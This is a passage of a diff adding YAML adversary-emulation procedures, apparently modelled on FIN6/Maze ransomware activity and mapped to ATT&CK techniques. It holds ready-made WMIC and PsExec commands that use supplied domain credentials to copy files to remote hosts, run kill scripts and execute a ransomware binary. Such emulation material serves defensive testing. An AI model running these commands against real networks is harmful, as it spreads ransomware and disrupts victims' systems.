+    command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\#{batch_file} c:\windows\temp\"
+
+- id: eb4c2ff6-3534-304c-cf1c-d864a508c162
+  name: Execute Kill Scripts via WMI
+  description: FIN6 has utilized WMI to execute kill scripts on intended targets
+  tactic: execution
+  technique:
+    attack_id: T1047
+    name: Windows Management Instrumentatio
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_ransomware_execute_wmic
+  procedure_step: 7.3.1
+  platforms:
+    windows:
+      cmd:
+        command: |
+          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd /c c:\windows\temp\#{batch_file}"
+
+  input_arguments:
+    internal_IP:
+      description: Hostname or IP address
+      type: string
+      default: 127.0.0.1
+    domain_user:
+      description: Domain and username
+      type: string
+    password:
+      description: Valid Password
+      type: string
+    batch_file:
+      description: windows.bat or kill.bat
+      type: string
+
+  executor: 
+    name: command_prompt
+    elevation_required: true
+    command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd /c c:\windows\temp\#{batch_file}"
+
+- id: c29e9cc7-b34f-d6c2-edbe-a41f757eae24
+  name: Execute Ransomware via WMIC
+  description: FIN6 has utilized WMI to execute the ransomeware on intended targets 
+  tactic: execution
+  technique:
+    attack_id: T1047
+    name: Windows Management Instrumentation
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_ransomware_execute_wmic
+  procedure_step: 7.3.2 
+  platforms:
+    windows:
+      cmd:
+        command: |
+          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd /c c:\windows\temp\sss.exe"
+
+  input_arguments:
+    internal_IP:
+      description: Hostname or IP address
+      type: string
+      default: 127.0.0.1
+    domain_user:
+      description: Domain and username
+      type: string
+    password:
+      description: Valid Password
+      type: string
+
+  executor: 
+    name: command_prompt
+    elevation_required: true
+    command: start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd /c c:\windows\temp\sss.exe"
+
+- id: 0c752dce-9302-6465-e05f-522650aece3f
+  name: Execute Kill Scripts via PsExec
+  description: FIN6 has utilized PsExec to execute kill scripts on intended targets
+  tactic: execution
+  technique:
+    attack_id: T1569.002
+    name: System Services:\ Service Execution
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html 
+  procedure_group: procedure_ransomware_execute_psexec
+  procedure_step: 7.3.3
+  platforms:
+    windows:
+      cmd:
+        command: |
+          start psexec.exe \\#{internal_IP} -u \#{domain_user} -p \#{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
+
+  input_arguments:
+    internal_IP:
+      description: Hostname or IP address
+      type: string
+      default: 127.0.0.1
+    domain_user:
+      description: Domain and username
+      type: string
+    password:
+      description: Valid Password
+      type: string
+    batch_file:
+      description: windows.bat or kill.bat
+      type: string
+
+  executor: 
+    name: command_prompt
+    elevation_required: true
+    command: start psexec.exe \\#{internal_IP} -u \#{domain_user} -p \#{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
+
+- id: d77838f6-d562-3480-2d29-2cbeee8b7b45
+  name: Execute Ransomware via PsExec
+  description: FIN6 has utilized PsExec to execute ransomeware on intended targets
+  tactic: execution
+  technique:
+    attack_id: T1569.002
+    name: System Services:\ Service Execution
+  cti_source: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html
+  procedure_group: procedure_ransomware_psexec
+  procedure_step: 7.3.4
+  platforms:
+    windows:
+      cmd:
+        command: |
+          start psexec.exe \\#{internal_IP} -u \#{domain_user} -p \#{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
+
+  input_arguments:
+    internal_IP:
+      description: Hostname or IP address
+      type: string
+      default: 127.0.0.1
+    domain_user:
+      description: Domain and username
+      type: string
+    password:
+      description: Valid Password
+      type: string
+
+  executor: 
+    name: command_prompt
+    elevation_required: true
+    command: start psexec.exe \\#{internal_IP} -u \#{domain_user} -p \#{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
+    
